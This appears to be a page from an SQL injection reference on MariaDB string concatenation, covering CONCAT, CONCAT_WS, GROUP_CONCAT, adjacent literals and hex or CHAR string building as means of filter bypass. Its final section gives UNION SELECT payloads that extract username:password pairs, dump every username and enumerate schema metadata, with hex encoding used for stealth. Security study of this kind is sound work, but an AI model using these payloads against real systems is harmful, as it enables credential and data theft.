---
title: String Concatenation
description: Methods for string concatenation in MariaDB
category: Injection Techniques
order: 11
tags: ["string operations", "concatenation", "sql functions"]
lastUpdated: 2025-12-18
---

## String Concatenation

String concatenation is essential for constructing complex queries or bypassing filters during SQL injection. MariaDB provides several methods to concatenate strings.

## Adjacent Literal Concatenation

MariaDB automatically concatenates adjacent string literals without any operator. This is a MySQL/MariaDB extension, not part of the ANSI SQL standard.

```sql
-- Multiple adjacent literals
SELECT 'a' 'd' 'mi' 'n'
-- Result: 'admin'

SELECT 'sel' 'ect'
-- Result: 'select'

SELECT 'a' 'b' 'c' 'd' 'e'
-- Result: 'abcde'
```

### Whitespace and Newlines

Adjacent literals work with whitespace and newlines between them:

```sql
-- With extra whitespace
SELECT 'hello'    'world'
-- Result: 'helloworld'

-- With newlines
SELECT 'hello'
'world'
-- Result: 'helloworld'

-- Empty strings are ignored
SELECT '' 'test' ''
-- Result: 'test'
```

### String Value Construction

Adjacent literals are useful for constructing string values without writing them as a single token in the input:

```sql
-- Build the string 'UNION' from fragments
SELECT 'UN' 'ION'
-- Result: 'UNION' (as a STRING value, not an SQL keyword)

-- Use in WHERE clause to match 'admin'
SELECT * FROM users WHERE username = 'ad' 'min'
-- Finds user with username 'admin'
```

> **Important Clarification:** Adjacent literal concatenation produces **string values**, not SQL keywords. Writing `SELECT 'UN' 'ION'` creates the string `"UNION"`, it does **not** execute a UNION operation. This technique bypasses input-level filters that block specific strings (e.g., a WAF blocking the literal text `'admin'` in input), but it cannot evade SQL parsers or filters that detect SQL keywords in query syntax. True SQL keyword obfuscation requires different techniques like comments (`UN/**/ION`) or encoding.

## CONCAT() Function

The most common method for string concatenation in MariaDB:

```sql
-- Basic concatenation
SELECT CONCAT('a', 'b')
-- Result: 'ab'

SELECT CONCAT('a', 'b', 'c')
-- Result: 'abc'

SELECT CONCAT('a', 'b', 'c', 'd', 'e')
-- Result: 'abcde'

-- Single argument returns the argument
SELECT CONCAT('single')
-- Result: 'single'
```

### NULL Handling

If any argument is NULL, `CONCAT()` returns NULL:

```sql
SELECT CONCAT('a', NULL, 'c')
-- Result: NULL
```

### Numbers and Type Conversion

`CONCAT()` automatically converts numbers to strings:

```sql
-- Integer conversion
SELECT CONCAT('id:', 123)
-- Result: 'id:123'

-- Float conversion
SELECT CONCAT('value:', 45.67)
-- Result: 'value:45.67'

-- Multiple numeric types
SELECT CONCAT('int:', 100, ' float:', 3.14)
-- Result: 'int:100 float:3.14'
```

### With Column Values

```sql
-- Combine column values
SELECT CONCAT(username, ':', password) AS creds FROM users WHERE id = 1

-- Empty strings work as expected
SELECT CONCAT('', 'test', '')
-- Result: 'test'
```

## CONCAT_WS() Function

`CONCAT_WS()` (Concatenate With Separator) joins strings with a specified separator:

```sql
-- Comma separator
SELECT CONCAT_WS(',', 'a', 'b', 'c')
-- Result: 'a,b,c'

-- Different separator
SELECT CONCAT_WS(' | ', 'a', 'b', 'c')
-- Result: 'a | b | c'

-- Empty separator (behaves like CONCAT)
SELECT CONCAT_WS('', 'a', 'b', 'c')
-- Result: 'abc'

-- Single value (no separator needed)
SELECT CONCAT_WS(',', 'single')
-- Result: 'single'
```

### NULL Handling

`CONCAT_WS()` skips NULL values (unlike `CONCAT()`):

```sql
-- NULL values are skipped
SELECT CONCAT_WS(',', 'a', NULL, 'c')
-- Result: 'a,c'

-- All NULL values returns empty string
SELECT CONCAT_WS(',', NULL, NULL, NULL)
-- Result: '' (empty string)

-- NULL separator returns NULL
SELECT CONCAT_WS(NULL, 'a', 'b', 'c')
-- Result: NULL
```

### With Numbers

```sql
SELECT CONCAT_WS('-', 1, 2, 3)
-- Result: '1-2-3'
```

## Using the "+" Operator

Unlike some other SQL dialects, MariaDB doesn't support "+" for string concatenation. It performs numeric addition:

```sql
-- Non-numeric strings convert to 0
SELECT 'a' + 'b'
-- Result: 0

SELECT 'abc' + 'xyz'
-- Result: 0

-- Numeric strings are converted and added
SELECT '5' + '3'
-- Result: 8

-- Mixed strings extract leading numbers
SELECT '5abc' + '3xyz'
-- Result: 8 (extracts 5 and 3)
```

### Contrast with CONCAT

```sql
SELECT
  'a' + 'b' AS plus_result,
  CONCAT('a', 'b') AS concat_result
-- plus_result: 0
-- concat_result: 'ab'
```

## GROUP_CONCAT() Function

For aggregating multiple rows into a single string:

```sql
-- Basic aggregation (default comma separator)
SELECT GROUP_CONCAT(username) FROM users
-- Result: 'admin,user1,user2,...'
```

### Custom Separator

```sql
SELECT GROUP_CONCAT(username SEPARATOR ';') FROM users
-- Result: 'admin;user1;user2'

SELECT GROUP_CONCAT(username SEPARATOR ' | ') FROM users
-- Result: 'admin | user1 | user2'
```

### ORDER BY

```sql
-- Ascending order
SELECT GROUP_CONCAT(username ORDER BY username ASC) FROM users

-- Descending order
SELECT GROUP_CONCAT(username ORDER BY username DESC) FROM users

-- Order by different column with custom separator
SELECT GROUP_CONCAT(username ORDER BY id DESC SEPARATOR ' | ') FROM users
```

### DISTINCT

```sql
-- Remove duplicates
SELECT GROUP_CONCAT(DISTINCT SCHEMA_NAME) FROM information_schema.SCHEMATA
```

### With Expressions

```sql
-- Combine with CONCAT for complex output
SELECT GROUP_CONCAT(CONCAT(id, ':', username)) FROM users
-- Result: '1:admin,2:user1,3:user2'
```

### Empty Result Set

```sql
-- Returns NULL when no rows match
SELECT GROUP_CONCAT(username) FROM users WHERE id = 99999
-- Result: NULL
```

> **Note:** GROUP_CONCAT output is limited by `group_concat_max_len` (default 1024 bytes, increased in newer versions) and `max_allowed_packet`. Results exceeding these limits are silently truncated - no error is thrown.

**Detecting truncation:**

```sql
-- Check if result length equals limit (likely truncated)
SELECT
  LENGTH(GROUP_CONCAT(col)) AS result_len,
  @@group_concat_max_len AS max_len
FROM table_name;
-- If result_len = max_len, data was likely truncated
```

**Workarounds:** Increase limit with `SET SESSION group_concat_max_len = 1000000;` or use LIMIT/OFFSET pagination.

## String Building Techniques

### Using CHAR()

Build strings character by character:

```sql
SELECT CONCAT(CHAR(97), CHAR(98), CHAR(99))
-- 97='a', 98='b', 99='c' -> 'abc'
```

### Using Hex Values

```sql
SELECT CONCAT(0x61, 0x62, 0x63)
-- 0x61='a', 0x62='b', 0x63='c' -> 'abc'
```

> **Note:** Hex literals default to binary strings. Mixing with regular strings can cause encoding issues. For explicit character set control, use `CHAR()` with the `USING` clause (e.g., `CHAR(97 USING utf8mb4)`) or a character set introducer (e.g., `_utf8mb4 0x61`).

### Mix with Subqueries

```sql
SELECT CONCAT('User: ', (SELECT username FROM users WHERE id = 1))
-- Result: 'User: admin'
```

### REPEAT Function

```sql
-- Repeat string multiple times
SELECT REPEAT('ab', 3)
-- Result: 'ababab'

-- Combine with CONCAT
SELECT CONCAT(REPEAT('*', 3), 'test', REPEAT('*', 3))
-- Result: '***test***'
```

## Injection Context Examples

### UNION SELECT with CONCAT

```sql
-- Extract credentials
' UNION SELECT 1, CONCAT(username, ':', password) FROM users-- -

-- Full query example
SELECT id, username FROM users WHERE id = 999
UNION SELECT 1, CONCAT(username, ':', password) FROM users WHERE id = 1
```

### Using Hex for Stealth

```sql
-- 0x7573657269643a = 'userid:'
' UNION SELECT 1, CONCAT(0x7573657269643a, id) FROM users-- -
```

### Extract Multiple Columns

```sql
-- Use CONCAT_WS for multiple values
SELECT id, username FROM users WHERE id = 999
UNION SELECT 1, CONCAT_WS(' | ', username, password, email) FROM users WHERE id = 1
```

### GROUP_CONCAT for Bulk Extraction

```sql
-- All usernames in single query
SELECT id, username FROM users WHERE id = 999
UNION SELECT 1, GROUP_CONCAT(username SEPARATOR ':') FROM users

-- Table and column metadata
SELECT id, username FROM users WHERE id = 999
UNION SELECT 1, GROUP_CONCAT(CONCAT(TABLE_NAME, '.', COLUMN_NAME) SEPARATOR ', ')
FROM information_schema.COLUMNS
WHERE TABLE_SCHEMA = DATABASE() AND TABLE_NAME = 'users'
```

### Adjacent Literals for String Construction

```sql
-- Build 'admin' from fragments (bypasses input-level string filters, not SQL keyword detection)
SELECT * FROM users WHERE username = 'ad' 'min'
```

## Quick Reference

| Method            | Syntax                            | NULL Behavior                |
| ----------------- | --------------------------------- | ---------------------------- |
| Adjacent literals | `'a' 'b'`                         | N/A                          |
| CONCAT()          | `CONCAT(a, b, c)`                 | Returns NULL if any NULL     |
| CONCAT_WS()       | `CONCAT_WS(sep, a, b, c)`         | Skips NULL values            |
| GROUP_CONCAT()    | `GROUP_CONCAT(col SEPARATOR sep)` | Returns NULL if empty set    |
| "+" operator      | `'a' + 'b'`                       | Numeric addition, not concat |

These concatenation techniques are invaluable for crafting advanced injection payloads, especially when limited space is available or when trying to extract multiple pieces of information in a single query.
